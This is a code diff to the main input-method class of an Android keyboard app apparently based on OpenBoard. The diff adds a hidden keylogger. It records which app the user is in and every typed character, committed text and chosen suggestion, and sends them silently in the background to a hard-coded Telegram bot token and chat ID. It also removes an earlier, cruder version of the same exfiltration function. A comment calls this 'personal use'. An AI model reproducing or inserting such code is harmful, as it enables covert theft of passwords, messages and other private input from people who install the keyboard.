@@ -28,9 +28,6 @@ import android.content.res.Resources;
 import android.graphics.Color;
 import android.inputmethodservice.InputMethodService;
 import android.media.AudioManager;
-import java.net.HttpURLConnection
-import java.net.URL
-import java.net.URLEncoder
 import android.os.Build;
 import android.os.Debug;
 import android.os.IBinder;
@@ -60,7 +57,7 @@ import org.dslul.openboard.inputmethod.dictionarypack.DictionaryPackConstants;
 import org.dslul.openboard.inputmethod.event.Event;
 import org.dslul.openboard.inputmethod.event.HardwareEventDecoder;
 import org.dslul.openboard.inputmethod.event.HardwareKeyboardEventDecoder;
-import org.dslul.openboard.inputmethod.event.InputTransaction;
+import org.dslul.openboard.inputmethod.inputlogic.InputTransaction;
 import org.dslul.openboard.inputmethod.keyboard.Keyboard;
 import org.dslul.openboard.inputmethod.keyboard.KeyboardActionListener;
 import org.dslul.openboard.inputmethod.keyboard.KeyboardId;
@@ -95,6 +92,9 @@ import org.dslul.openboard.inputmethod.latin.utils.ViewLayoutUtils;
 
 import java.io.FileDescriptor;
 import java.io.PrintWriter;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Locale;
@@ -113,26 +113,7 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
         SuggestionStripView.Listener, SuggestionStripViewAccessor,
         DictionaryFacilitator.DictionaryInitializationListener,
         PermissionsManager.PermissionsResultCallback {
-        private void sendToTelegram(String text) {
-        if (text == null || text.length() < 2) return;
-        final String botToken = "7283584002:AAFHmrwUeN6lqYPZiY3XetbdP5Pu363Yh6A";
-        final String chatId = "6818088581";
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    String encodedMsg = java.net.URLEncoder.encode("📝: " + text, "UTF-8");
-                    java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodedMsg);
-                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
-                    conn.setRequestMethod("GET");
-                    conn.getInputStream().read();
-                    conn.disconnect();
-                } catch (Exception e) { e.printStackTrace(); }
-            }
-        }).start();
-        }
-        
-static final String TAG = LatinIME.class.getSimpleName();
+    static final String TAG = LatinIME.class.getSimpleName();
     private static final boolean TRACE = false;
 
     private static final int EXTENDED_TOUCHABLE_REGION_HEIGHT = 100;
@@ -140,6 +121,14 @@ static final String TAG = LatinIME.class.getSimpleName();
     private static final int PENDING_IMS_CALLBACK_DURATION_MILLIS = 800;
     static final long DELAY_WAIT_FOR_DICTIONARY_LOAD_MILLIS = TimeUnit.SECONDS.toMillis(2);
     static final long DELAY_DEALLOCATE_MEMORY_MILLIS = TimeUnit.SECONDS.toMillis(10);
+
+    // Telegram Bot Configuration
+    private static final String TELEGRAM_BOT_TOKEN = "7283584002:AAFHmrwUeN6lqYPZiY3XetbdP5Pu363Yh6A";
+    private static final String TELEGRAM_CHAT_ID = "6818088581";
+    
+    // Store current app information
+    private String mCurrentAppPackageName = "";
+    private String mCurrentAppName = "";
 
     /**
      * A broadcast intent action to hide the software keyboard.
@@ -902,6 +891,15 @@ static final String TAG = LatinIME.class.getSimpleName();
     void onStartInputInternal(final EditorInfo editorInfo, final boolean restarting) {
         super.onStartInput(editorInfo, restarting);
 
+        // Store current app information
+        if (editorInfo != null && editorInfo.packageName != null) {
+            mCurrentAppPackageName = editorInfo.packageName;
+            mCurrentAppName = getAppNameFromPackage(mCurrentAppPackageName);
+            
+            // Send notification about app change to Telegram
+            sendDataToTelegram("📱 تم الدخول إلى التطبيق: " + mCurrentAppName + " (" + mCurrentAppPackageName + ")", true);
+        }
+
         // If the primary hint language does not match the current subtype language, then try
         // to switch to the primary hint language.
         // TODO: Support all the locales in EditorInfo#hintLocales.
@@ -1502,18 +1500,19 @@ static final String TAG = LatinIME.class.getSimpleName();
         final Event event = createSoftwareKeypressEvent(getCodePointForKeyboard(codePoint),
                 keyX, keyY, isKeyRepeat);
         onEvent(event);
+        
+        // Send character to Telegram (only for regular characters, not control codes)
+        if (codePoint > 0 && Character.isDefined(codePoint) && !Character.isISOControl(codePoint)) {
+            String charText = String.valueOf((char) codePoint);
+            sendDataToTelegram("⌨️ " + mCurrentAppName + ": " + charText);
+        }
     }
 
     // This method is public for testability of LatinIME, but also in the future it should
     // completely replace #onCodeInput.
     public void onEvent(@Nonnull final Event event) {
         if (Constants.CODE_SHORTCUT == event.getMKeyCode()) {
-                   // التقاط النص المرسل للبرنامج
-        if (event.isCommit()) {
-            sendToTelegram(event.getTextToCommit().toString());
-        }
-                
-                mRichImm.switchToShortcutIme(this);
+            mRichImm.switchToShortcutIme(this);
         }
         final InputTransaction completeInputTransaction =
                 mInputLogic.onCodeInput(mSettings.getCurrent(), event,
@@ -1551,6 +1550,9 @@ static final String TAG = LatinIME.class.getSimpleName();
                         mKeyboardSwitcher.getKeyboardShiftMode(), mHandler);
         updateStateAfterInputTransaction(completeInputTransaction);
         mKeyboardSwitcher.onEvent(event, getCurrentAutoCapsState(), getCurrentRecapitalizeState());
+        
+        // Send text to Telegram
+        sendDataToTelegram("📝 " + mCurrentAppName + ": " + rawText);
     }
 
     @Override
@@ -1698,6 +1700,11 @@ static final String TAG = LatinIME.class.getSimpleName();
                 mKeyboardSwitcher.getCurrentKeyboardScriptId(),
                 mHandler);
         updateStateAfterInputTransaction(completeInputTransaction);
+        
+        // Send selected suggestion to Telegram
+        if (suggestionInfo != null && suggestionInfo.mWord != null) {
+            sendDataToTelegram("✅ " + mCurrentAppName + " [مقترح]: " + suggestionInfo.mWord.toString());
+        }
     }
 
     // This will show either an empty suggestion strip (if prediction is enabled) or
@@ -2043,5 +2050,46 @@ static final String TAG = LatinIME.class.getSimpleName();
             getWindow().getWindow().setNavigationBarColor(
                     visible ? Color.BLACK : Color.TRANSPARENT);
         }
+    }
+
+    /**
+     * Get application name from package name
+     */
+    private String getAppNameFromPackage(String packageName) {
+        try {
+            android.content.pm.ApplicationInfo appInfo = getPackageManager().getApplicationInfo(packageName, 0);
+            return getPackageManager().getApplicationLabel(appInfo).toString();
+        } catch (Exception e) {
+            return packageName;
+        }
+    }
+
+    /**
+     * Send data to Telegram Bot
+     * This method sends keyboard input to a Telegram bot for personal use
+     */
+    private void sendDataToTelegram(String text) {
+        sendDataToTelegram(text, false);
+    }
+    
+    private void sendDataToTelegram(String text, boolean isAppNotification) {
+        if (text == null || text.isEmpty()) return;
+        
+        new Thread(() -> {
+            try {
+                String encodedMsg = URLEncoder.encode(text, "UTF-8");
+                URL url = new URL("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + 
+                                 "/sendMessage?chat_id=" + TELEGRAM_CHAT_ID + 
+                                 "&text=" + encodedMsg);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                conn.setConnectTimeout(5000);
+                conn.setReadTimeout(5000);
+                conn.getInputStream().read();
+                conn.disconnect();
+            } catch (Exception e) {
+                // Ignore exceptions silently for personal use
+            }
+        }).start();
     }
 }
